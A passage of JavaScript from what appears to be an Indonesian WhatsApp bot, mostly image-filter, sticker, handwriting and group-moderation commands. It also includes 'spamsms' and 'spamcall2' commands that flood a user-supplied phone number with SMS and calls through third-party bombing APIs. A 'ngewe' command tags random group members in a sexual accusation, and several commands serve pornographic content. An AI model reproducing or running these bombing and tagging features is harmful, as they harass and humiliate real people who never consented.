.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
 }
  }
  break
  case 'spamsms':{
if (!isPremium) return reply(`khusus premium`)
  if (args.length > 1) return reply(`Cara penggunaan : ${command} no hp`)


 try {
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=IkyChan&nomor=${args[1]}`)
await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=IkyChan&nomor=${args[1]}`)
reply("Success")
 } catch (err) {
sendMess(ownerNumber, `${command} Error:` + err)
reply(mess.error.api)
 }
  }
  break

  case '!':
  case '#':
  case 'z':
  case '.':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
break
 ////NEW UPDATE COPAS DARI XINZ
 case 'threats':

 if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
var link = await uptotele(yoooo)
getBuffer(`https://nekobot.xyz/api/imagegen?type=threats&url=${link}&raw=1`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
}) 
 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
  fs.unlinkSync(yoooo)
  if (err) return reply('Gagal :V')
 var link = await uptotele(ran)
  getBuffer(`https://nekobot.xyz/api/imagegen?type=threats&url=${link}&raw=1`)
  .then(async(res) =>{
 kahfzz.sendImage(from, res, 'ini', msg)
 limitAdd(sender, limit)
 fs.unlinkSync(ran)
  })
})
 } else {
  reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
break
case 'buriq': case 'burik':

if (isImage || isQuotedImage) {
 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 var link = await uptotele(yoooo)
 getBuffer(`https://nekobot.xyz/api/imagegen?type=jpeg&url=${link}&raw=1`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
 }) 
  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 let ran = getRandom('.png')
 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return reply('Gagal :V')
  var link = await uptotele(ran)
getBuffer(`https://nekobot.xyz/api/imagegen?type=jpeg&url=${link}&raw=1`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
  fs.unlinkSync(ran)
})
 })
  } else {
reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
 }
 break
 case 'getstory':

 if (!args.length) return reply(from, "Urutan keberapa? #getstory urutan", lin)
  quotedText = kahfz.message.extendedTextMessage.contextInfo.quotedMessage.conversation
var pilur = quotedText.split('👱🏻‍♂️ *Username :* ')
var a = await axios.get(`https://megayaa.herokuapp.com/api/igstori?username=${pilur[1].split("\n")[0]}`)

if (!q.match(/^[0-9]/)) return reply(from, "Pastikan urutan hanya angka", kahfz)
  var typemsgg = image
if (a.data.data[q - 1].type === "mp4") typemsgg = video
  await kahfzz.sendMessage(from, {url: `${a.data.data[q - 1].url}`}, typemsgg)

break
case 'igstory':
var a = await axios.get(`https://megayaa.herokuapp.com/api/igstori?username=${args.join(" ")}`)
var teks = `*Instagram story downloader*\n\n👱🏻‍♂️ *Username :* ${a.data.username}\n🖼️ *Count :* ${a.data.stories_count}\n\nreply pesan dan ketik *${prefix}getstory urutan* untuk mengambil media\n\n`
var urut = 1
for (let i = 0; i < a.data.data.length; i++) {
  var ab = await axios.get(`https://megayaa.herokuapp.com/api/short/tiny?url=${a.data.data[i].url}`)
  teks += `*Urutan : ${urut++}*\n💻 *Type :* ${a.data.data[i].type === "mp4" ? "video 🎥" : "foto 📸"}\n📑 *Url :* ${ab.data.result}\n\n`
}
kahfzz.sendMessage(from, teks, text,{ quoted: kahfz})


break
case 'deep': case 'deepfry':

if (isImage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
  let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  var link = await uptotele(yoooo)
  getBuffer(`https://nekobot.xyz/api/imagegen?type=deepfry&image=${link}&raw=1`)
  .then(async(res) =>{
 kahfzz.sendImage(from, res, 'ini', msg)
 limitAdd(sender, limit)
  }) 
} else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
  let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  let ran = getRandom('.png')
  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
 fs.unlinkSync(yoooo)
 if (err) return reply('Gagal :V')
var link = await uptotele(ran)
 getBuffer(`https://nekobot.xyz/api/imagegen?type=deepfry&image=${link}&raw=1`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
fs.unlinkSync(ran)
 })
  })
} else {
 reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
  }
  break
  case 'magik': case 'magic':

  if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
var link = await uptotele(yoooo)
getBuffer(`https://nekobot.xyz/api/imagegen?type=magik&image=${link}&raw=1`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
}) 
 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
  fs.unlinkSync(yoooo)
  if (err) return reply('Gagal :V')
 var link = await uptotele(ran)
  getBuffer(`https://nekobot.xyz/api/imagegen?type=magik&image=${link}&raw=1`)
  .then(async(res) =>{
 kahfzz.sendImage(from, res, 'ini', msg)
 limitAdd(sender, limit)
 fs.unlinkSync(ran)
  })
})
 } else {
  reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
break
case 'blurpify':

if (isImage || isQuotedImage) {
 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 var link = await uptotele(yoooo)
 getBuffer(`https://nekobot.xyz/api/imagegen?type=blurpify&image=${link}&raw=1`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
 }) 
  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 let ran = getRandom('.png')
 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return reply('Gagal :V')
  var link = await uptotele(ran)
getBuffer(`https://nekobot.xyz/api/imagegen?type=blurpify&image=${link}&raw=1`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
  fs.unlinkSync(ran)
})
 })
  } else {
reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
 }
 break
 case 'captcha':

 if (!q) return reply(`Penggunaan ${command} query lalu reply gambar/sticker`)
  if (isImage || isQuotedImage) {
 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 var link = await uptotele(yoooo)
 getBuffer(`https://nekobot.xyz/api/imagegen?type=captcha&url=${link}&raw=1&username=${q}`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
 }) 
  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 let ran = getRandom('.png')
 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return reply('Gagal :V')
  var link = await uptotele(ran)
getBuffer(`https://nekobot.xyz/api/imagegen?type=captcha&url=${link}&raw=1&username=${q}`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
  fs.unlinkSync(ran)
})
 })
  } else {
reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
 }
 break
 case 'glass':

 if (isImage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
  let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  var link = await uptotele(yoooo)
  getBuffer(`https://some-random-api.ml/canvas/glass?avatar=${link}`)
  .then(async(res) =>{
 kahfzz.sendImage(from, res, 'ini', msg)
 limitAdd(sender, limit)
  }) 
} else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
  let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  let ran = getRandom('.png')
  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
 fs.unlinkSync(yoooo)
 if (err) return reply('Gagal :V')
var link = await uptotele(ran)
 getBuffer(`https://some-random-api.ml/canvas/glass?avatar=${link}`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
fs.unlinkSync(ran)
 })
  })
} else {
 reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
  }
  break
  case 'greyscale':

  if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
var link = await uptotele(yoooo)
getBuffer(`https://some-random-api.ml/canvas/greyscale?avatar=${link}`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
}) 
 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
  fs.unlinkSync(yoooo)
  if (err) return reply('Gagal :V')
 var link = await uptotele(ran)
  getBuffer(`https://some-random-api.ml/canvas/greyscale?avatar=${link}`)
  .then(async(res) =>{
 kahfzz.sendImage(from, res, 'ini', msg)
 limitAdd(sender, limit)
 fs.unlinkSync(ran)
  })
})
 } else {
  reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
break
case 'invert':

if (isImage || isQuotedImage) {
 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 var link = await uptotele(yoooo)
 getBuffer(`https://some-random-api.ml/canvas/invert?avatar=${link}`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
 }) 
  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 let ran = getRandom('.png')
 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return reply('Gagal :V')
  var link = await uptotele(ran)
getBuffer(`https://some-random-api.ml/canvas/invert?avatar=${link}`)
.then(async(res) =>{
  kahfzz.sendImage(from, res, 'ini', msg)
  limitAdd(sender, limit)
  fs.unlinkSync(ran)
})
 })
  } else {
reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
 }
 break
 case 'tagme':
 mentions(`@${sender.split("@")[0]}`, [sender], true)
 break
 case 'invertgrey':

 if (isImage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
  let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  var link = await uptotele(yoooo)
  getBuffer(`https://some-random-api.ml/canvas/invertgreyscale?avatar=${link}`)
  .then(async(res) =>{
 kahfzz.sendImage(from, res, 'ini', msg)
 limitAdd(sender, limit)
  }) 
} else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {
  let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  let yoooo = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  let ran = getRandom('.png')
  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
 fs.unlinkSync(yoooo)
 if (err) return reply('Gagal :V')
var link = await uptotele(ran)
 getBuffer(`https://some-random-api.ml/canvas/invertgreyscale?avatar=${link}`)
 .then(async(res) =>{
kahfzz.sendImage(from, res, 'ini', msg)
limitAdd(sender, limit)
fs.unlinkSync(ran)
 })
  })
} else {
 reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
  }
  break
  case 'nulishelp':
  reply(`*Pilihan*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
  break
  case 'nuliskiri':
{

if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
  reply(mess.wait)
const tulisan = body.slice(11)
const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
spawn('convert', [
  './media/nulis/images/buku/sebelumkiri.jpg',
  '-font',
  './media/nulis/font/Indie-Flower.ttf',
  '-size',
  '960x1280',
  '-pointsize',
  '22',
  '-interline-spacing',
  '2',
  '-annotate',
  '+140+153',
  fixHeight,
  './media/nulis/images/buku/setelahkiri.jpg'
  ])
.on('error', () => reply(mess.error.api))
.on('exit', () => {
  kahfzz.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})

})
 }
 break
 case 'nuliskanan':{

if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
  reply(mess.wait)
const tulisan = body.slice(12)
const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
spawn('convert', [
  './media/nulis/images/buku/sebelumkanan.jpg',
  '-font',
  './media/nulis/font/Indie-Flower.ttf',
  '-size',
  '960x1280',
  '-pointsize',
  '23',
  '-interline-spacing',
  '2',
  '-annotate',
  '+128+129',
  fixHeight,
  './media/nulis/images/buku/setelahkanan.jpg'
  ])
.on('error', () => reply(mess.error.api))
.on('exit', () => {
  kahfzz.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})

})
 }
 break
 case 'foliokiri':{

if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
  reply(mess.wait)
const tulisan = body.slice(11)
const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
spawn('convert', [
  './media/nulis/images/folio/sebelumkiri.jpg',
  '-font',
  './media/nulis/font/Indie-Flower.ttf',
  '-size',
  '1720x1280',
  '-pointsize',
  '23',
  '-interline-spacing',
  '4',
  '-annotate',
  '+48+185',
  fixHeight,
  './media/nulis/images/folio/setelahkiri.jpg'
  ])
.on('error', () => reply(mess.error.api))
.on('exit', () => {
  kahfzz.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})

})
 }
 break
 case 'foliokanan':{

if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
  reply(mess.wait)
const tulisan = body.slice(12)
const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
spawn('convert', [
  './media/nulis/images/folio/sebelumkanan.jpg',
  '-font',
  './media/nulis/font/Indie-Flower.ttf',
  '-size',
  '960x1280',
  '-pointsize',
  '23',
  '-interline-spacing',
  '3',
  '-annotate',
  '+89+190',
  fixHeight,
  './media/nulis/images/folio/setelahkanan.jpg'
  ])
.on('error', () => reply(mess.error.api))
.on('exit', () => {
  kahfzz.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})

})
 }
 break
 case 'slap':

 if (mentioned.length !== 0){
fetchJson ('https://www.nekos.life/api/v2/img/slap').then(({url}) => {
  kahfzz.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} slapped @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})
})
 } else {
reply(`Penggunaan ${command} @tag`)
 }
 break
 case 'pat':

 if (mentioned.length !== 0){
fetchJson ('https://www.nekos.life/api/v2/img/pat').then(({url}) => {
  kahfzz.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
 await sleep(2000);mentions(`@${sender.split('@')[0]} pat @${mentioned[0].split('@')[0]}`, [sender, mentioned[0]], true)})
})
 } else {
reply(`Penggunaan ${command} @tag`)
 }
 break
 case 'baka':

 if (mentioned.length !== 0){
fetchJson ('https://www.nekos.life/api/v2/img/baka').then(({url}) => {
  kahfzz.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} Baka!!`, [sender, mentioned[0]], true)})
})
 } else {
reply(`Penggunaan ${command} @tag`)
 }
 break

 case 'semoji2': {

if (args.length < 2) return reply(`Penggunaan ${command} emoji`)
  if (args.length === 2) {
 fetchJson(`https://api.lolhuman.xyz/api/smoji3/${encodeURIComponent(args[1])}?apikey=IkyChan`)
 .then((res) =>{
let list = []
let startnum = 1
for (var x in res.result.emoji) {
  let yy = {title: 'Model ke-' + startnum++,
  rows: [
  {
 title: `${x}`,
 description: `${x} model`,
 rowId: `${prefix}esticker ${args[1]} ${res.result.emoji[x]}`
  }
  ]
}
list.push(yy)
 }
 kahfzz.sendList(from, `List Sticker`, `Kan model stickernya banyak tu kak, kaka mau model sticker yg mana ya? Pilih dibawah ya kak`, args[1], `Pilih Disini`, list, msg)
  })
 .catch((err) => {
kahfzz.sendMess(ownerNumber[0], `${command} Error:` + err)
reply(mess.error.api)
 })
  } else if (args.length === 3) {
 kahfzz.sendSticker(from, args[2], msg)

  }
}
break
case 'tebakumur':

              if (args.length == 0) return reply(`Example: ${prefix + command} jamet`)

              query = args.join(" ")

              asw = await fetchJson(`https://api.lolhuman.xyz/api/tebakumur?apikey=${setting.lolkey}&name=${query}`)

              ngontol = await getBuffer(asw.result)  

              teksnyaa = `TEBAK UMUR\n${asw.result}[ *TEBAK UMUR BY KAHFZ - BOTZ* ]` 

              kahfzz.sendMessage(from, teksnyaa, text, { quoted: freply})  

              break
case 'ceritasex': case 'cersex':


fetchJson('http://docs-jojo.herokuapp.com/api/cersex')
.then((res) => kahfzz.sendFileFromUrl(from, res.result.img, res.result.judul + `\n\n` + res.result.cersex))
.catch((err) => {
  kahfzz.sendMess(ownerNumber[0], `${command} Error:` + err)
  reply(mess.error.api)
})
break
case 'aspan': case 'ptl': case 'ptlvid':{
  if (!isPremium) return reply(mess.OnlyPrem)
 fetchText('http://sansekai.my.id/sansekai.txt').then((data) => {
var wifegerak = data.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
kahfzz.sendFileFromUrl(from, `http://sansekai.my.id/ptl_repost/${wifegerakx}`, 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.', msg)
 })
}
break
case 'spamcall2':{
  if (!isPremium) return reply(mess.OnlyPrem)
 if (args.length > 2) return reply(`Cara penggunaan : ${command} no hp`)
if (isNaN(args[1]) && args[1].startsWith('62')) return reply(`Harus berupa angka dan pastikan tidak memasukkan kode negara, contoh: ${command} 8127668234`)
  fetchJson(`https://api.justaqul.xyz/call?nomor=${args[1]}&apikey=${aqulzkey}`)
.then((data) => {
  textImg(data.result)
})
.catch((err) => {
  kahfzz.sendMess(ownerNumber[0], `${command} Error:` + err)
  reply(mess.error.api)
})
 }
 break
 case 'hug':

 if (mentioned.length !== 0){
fetchJson ('https://www.nekos.life/api/v2/img/hug').then(({url}) => {
  kahfzz.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} hugged @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})
})
 } else {
reply(`Penggunaan ${command} @tag`)
 }
 break
 case 'cium':

 if (mentioned.length !== 0){
fetchJson ('https://www.nekos.life/api/v2/img/kiss').then(({url}) => {
  kahfzz.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} kissed @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})
})
 } else {
reply(`Penggunaan ${command} @tag`)
 }
 break
 case 'bokep': case 'bkp': case 'randombokep':{
if (!isPremium) return reply(mess.OnlyPrem)

  fetchJson(`https://pastebin.com/raw/k82VJzeP`).then((data) => {
 var bokepp = JSON.parse(JSON.stringify(data))
 var bokep2 =  bokepp[Math.floor(Math.random() * bokepp.length)]
 textImg(bokep2.teks)
  })
 }
 break
////Anti delete
case 'antidelete':
if (!isOwner && !isGroupAdmins) return reply(mess.GrupAdmin)
  const dataRevoke = JSON.parse(fs.readFileSync('./database/gc-revoked.json'))
const dataCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked.json'))
const dataBanCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked-banlist.json'))
const isRevoke = dataRevoke.includes(from)
const isCtRevoke = dataCtRevoke.data
const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
if (args.length === 1) return reply(`Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
  if (args[1] == 'aktif') {
if (isGroup) {
 if (isRevoke) return reply(`Antidelete telah diaktifkan di grup ini sebelumnya!`)
dataRevoke.push(from)
 fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
 reply(`Antidelete diaktifkan di grup ini!`)
  } else if (!isGroup) {
 reply(`Untuk kontak penggunaan *${prefix}antidelete ctaktif*`)
  }
} else if (args[1] == 'ctaktif') {
  if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (!isGroup) {
 if (isCtRevoke) return reply(`Antidelete telah diaktifkan di semua kontak sebelumnya!`)
dataCtRevoke.data = true
 fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
 reply(`Antidelete diaktifkan disemua kontak!`)
  } else if (isGroup) {
 reply(`Untuk grup penggunaan *${prefix}antidelete aktif*`)
  }
} else if (args[1] == 'banct') {
  if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (isBanCtRevoke) return reply(`kontak ini telah ada di database banlist!`)
  if (args.length === 2 || args[2].startsWith('0')) return reply(`Masukan nomer diawali dengan 62! contoh 62859289xxxxx`)
 dataBanCtRevoke.push(args[2] + '@s.whatsapp.net')
  fs.writeFileSync('./database/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
  reply(`Kontak ${args[2]} telah dimasukan ke banlist antidelete secara permanen!`)
} else if (args[1] == 'mati') {
  if (isGroup) {
const index = dataRevoke.indexOf(from)
dataRevoke.splice(index, 1)
fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
reply(`Antidelete dimatikan di grup ini!`)
 } else if (!isGroup) {
reply(`Untuk kontak penggunaan *${prefix}antidelete ctmati*`)
 }
  } else if (args[1] == 'ctmati') {
 if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
  if (!isGroup) {
dataCtRevoke.data = false
fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
reply(`Antidelete dimatikan disemua kontak!`)
 } else if (isGroup) {
reply(`Untuk grup penggunaan *${prefix}antidelete mati*`)
 }
  } else {
 reply(`Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
  }
  break
case 'ngewe':
				if (!isGroup) return reply(dpa.groupo)
				jds = []
				const jdiid = groupMembers
				const kosst = groupMembers
				const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
				const diaat = kosst[Math.floor(Math.random() * kosst.length)]
				teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan️ @${diaat.jid.split('@')[0]} Ngewe Di Sawah Ajg Di Entod Entod Sampe Keciduk `
				jds.push(akuut.jid)
				jds.push(diaat.jid)
				mentions(teks, jds, true)
				await limitAdd(sender)
				membr.push(beb.jid)
mentions(teks, jds, true)
				break
				//
				case 'setname':
  if (!isOwner) return reply(mess.OnlyOwner)
 if (args.length < 2) return reply(`Masukkan text`)
  await kahfzz.updateProfileName(q)
reply(`Success`)
break
case 'revoke':
case 'revokegroup':
case 'revokelink': {
 if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins)return reply(mess.GrupAdmin)
  if (!isBotGroupAdmins) return reply(mess.BotAdmin)
 var linkgc = await kahfzz.revokeInvite(from)
  mentions(`Link Group Berhasil direset oleh admin @${sender.split('@')[0]}`, [sender], true)
}
break
					//------------------< Enable / Disable >-------------------
 case 'antibadword':
 if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
  if (!isBotGroupAdmins) return reply(mess.BotAdmin)
 if (args.length === 1) return reply(`Pilih enable atau disable`)
if (args[1].toLowerCase() === 'enable'){
  if (isBadword) return reply(`Udah aktif`)
 grupbadword.push(from)
  fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
  reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
} else if (args[1].toLowerCase() === 'disable'){
  anu = grupbadword.indexOf(from)
  grupbadword.splice(anu, 1)
  fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
  reply('antibadword grup nonaktif')
} else {
  testqq(from, `antibadword`)
}
break
case 'listbadword':
bi = `List badword\n\n`
for (let boo of badword){
  bi += `- ${boo}\n`
}
bi += `\nTotal : ${badword.length}`
reply(bi)
break
case 'addbadword':
if (!isGroupAdmins && !isPremium)return reply(mess.GrupAdmin)
  if (args.length < 2) return reply(`masukkan kata`)
 if (isKasar(args[1].toLowerCase(), badword)) return reply(`Udah ada`)
addBadword(args[1].toLowerCase(), badword)
 reply(`Sukses`)
 break
 case 'delbadword':
 if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 2) return reply(`masukkan kata`)
  if (!isKasar(args[1].toLowerCase(), badword)) return reply(`Ga ada`)
 delBadword(args[1].toLowerCase(), badword)
  reply(`Sukses`)
  break
  case 'clearbadword':
